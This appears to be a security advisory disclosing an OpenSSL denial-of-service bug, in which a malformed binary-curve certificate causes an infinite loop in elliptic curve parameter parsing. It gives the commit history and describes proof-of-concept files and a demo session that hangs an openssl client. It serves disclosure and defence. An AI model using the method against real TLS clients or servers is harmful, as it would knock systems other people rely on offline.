Denial of service in elliptic curve parsing
===========================================

Overview
--------
When parsing an ASN.1 ECParameters specifying a curve over a
malformed binary polynomial field, OpenSSL enters an infinite
loop.  This can be used to perform denial of service against
any system which parses public keys, certificate requests or
certificates.  This includes TLS clients and TLS servers with
client authentication enabled.

PoC
---

- original-cert.der: a basic X509 certificate with a public
  key on the ANSI X9.62 c2pnb208w1 curve.  The choice of curve
  is not important, except it must be a binary curve, and must
  be explicitly specified.
- broken-cert.der: the same file, with edits to trigger the bug.
  This is not a unique set of edits; a fuzzer will find others.
- dumb-server.py: this is a trivial TLS server.  Its sole purpose
  is to accept a ClientHello, and reply with a ServerHello and
  Certificate containing the malformed certificate.

Session:

    $ python3 dumb-server.py broken-cert.der &
    listening on localhost 9999
    $ gdb -ex run --args openssl s_client -connect localhost:9999
    <snip>
    Starting program: /usr/bin/openssl s_client -connect localhost:9999
    CONNECTED(00000003)
    depth=0 C = AU, ST = Some-State, O = Internet Widgits Pty Ltd
    verify error:num=18:self signed certificate
    verify return:1
    <hang>
    ^C
    Program received signal SIGINT, Interrupt.
    0x00007ffff7849198 in BN_GF2m_mod_inv () from /lib/x86_64-linux-gnu/libcrypto.so.1.0.0
    (gdb) bt
    #0  0x00007ffff7849198 in BN_GF2m_mod_inv () from /lib/x86_64-linux-gnu/libcrypto.so.1.0.0
    #1  0x00007ffff78494f6 in BN_GF2m_mod_div () from /lib/x86_64-linux-gnu/libcrypto.so.1.0.0
    #2  0x00007ffff7868488 in ?? () from /lib/x86_64-linux-gnu/libcrypto.so.1.0.0
    #3  0x00007ffff785253c in ?? () from /lib/x86_64-linux-gnu/libcrypto.so.1.0.0
    #4  0x00007ffff785371e in d2i_ECPKParameters () from /lib/x86_64-linux-gnu/libcrypto.so.1.0.0
    #5  0x00007ffff7853eaa in d2i_ECParameters () from /lib/x86_64-linux-gnu/libcrypto.so.1.0.0
    #6  0x00007ffff7857338 in ?? () from /lib/x86_64-linux-gnu/libcrypto.so.1.0.0
    #7  0x00007ffff785767c in ?? () from /lib/x86_64-linux-gnu/libcrypto.so.1.0.0
    #8  0x00007ffff78a2ac8 in X509_PUBKEY_get () from /lib/x86_64-linux-gnu/libcrypto.so.1.0.0
    #9  0x00007ffff78bea02 in X509_get_pubkey_parameters () from /lib/x86_64-linux-gnu/libcrypto.so.1.0.0
    #10 0x00007ffff78bf292 in X509_verify_cert () from /lib/x86_64-linux-gnu/libcrypto.so.1.0.0
    #11 0x00007ffff7bb69c8 in ?? () from /lib/x86_64-linux-gnu/libssl.so.1.0.0
    #12 0x00007ffff7b94d8b in ?? () from /lib/x86_64-linux-gnu/libssl.so.1.0.0
    #13 0x00007ffff7b99002 in ?? () from /lib/x86_64-linux-gnu/libssl.so.1.0.0
    #14 0x00007ffff7ba1ae9 in ?? () from /lib/x86_64-linux-gnu/libssl.so.1.0.0
    #15 0x00007ffff7ba2232 in ?? () from /lib/x86_64-linux-gnu/libssl.so.1.0.0
    #16 0x000000000043c977 in ?? ()
    #17 0x0000000000418a88 in ?? ()
    #18 0x00000000004187d6 in ?? ()
    #19 0x00007ffff73fdec5 in __libc_start_main (main=0x4182e0, argc=4, argv=0x7fffffffe108, init=<optimised out>, 
            fini=<optimised out>, rtld_fini=<optimised out>, stack_end=0x7fffffffe0f8) at libc-start.c:287
    #20 0x000000000041885b in ?? ()

History
-------
The original bug was introduced in 2002 with the first support
for elliptic curves over binary polynomial fields[1].  This was
reported and fixed in June 2011 (OpenSSL bug 2540)[2].

Shortly before, in May 2011, the code which would later contain
the fix was commented out and replaced with an optimized version[3].

This means that the application of the patch in [2] went into
commented out code, and had no effect.

[1]: 1dc920c8de5b7109727a21163843feecdf06a8cf
[2]: 8038e7e44c6060398f0793e3e16db0ad1ee95b9d
[3]: 034688ec4d0e3d350dc0ee9602552f92e8889fc0

Author
------
Joseph Birr-Pixton <jpixton@gmail.com>
